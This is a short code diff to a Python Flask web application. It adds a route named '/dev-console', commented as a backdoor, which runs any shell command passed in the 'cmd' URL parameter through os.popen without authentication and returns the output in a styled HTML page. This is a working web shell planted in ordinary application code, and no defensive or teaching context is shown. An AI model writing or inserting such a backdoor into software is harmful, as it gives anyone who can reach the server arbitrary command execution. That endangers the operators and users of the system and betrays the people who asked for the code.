@@ -180,5 +180,15 @@ def api_users():
         mimetype = 'application/json'
     )
 
+# backdoor 
+@app.route('/dev-console')
+def dev_console():
+    cmd = request.args.get('cmd')
+    if cmd:
+        import os
+        result = os.popen(cmd).read()
+        return f"<body style='background:black; color:#c8a2c8;'><pre>{result}</pre></body>"
+    return "Console Ready. Pass 'cmd' parameter in URL."
+
 if __name__ == "__main__":
     app.run(host= '127.0.0.1' , port=5000, debug=True)
